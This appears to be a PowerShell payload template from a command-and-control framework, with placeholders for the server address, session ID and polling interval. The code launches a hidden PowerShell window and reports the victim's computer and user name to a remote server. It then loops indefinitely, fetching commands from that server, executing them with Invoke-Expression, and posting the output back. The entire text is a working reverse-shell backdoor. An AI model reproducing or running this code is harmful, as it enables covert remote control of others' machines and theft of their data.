Start-Process $PSHOME\powershell.exe -ArgumentList {$s='*SERVERIP*';$i='*SESSIONID*';$p='http://';$v=Invoke-RestMethod *PROXY* -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{'*HOAXID*'=$i};for (;;){$c=(Invoke-RestMethod *PROXY* -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{'*HOAXID*'=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod *PROXY* -Uri $p$s/*POSTRES* -Method POST -Headers @{'*HOAXID*'=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep *FREQ*}} -WindowStyle Hidden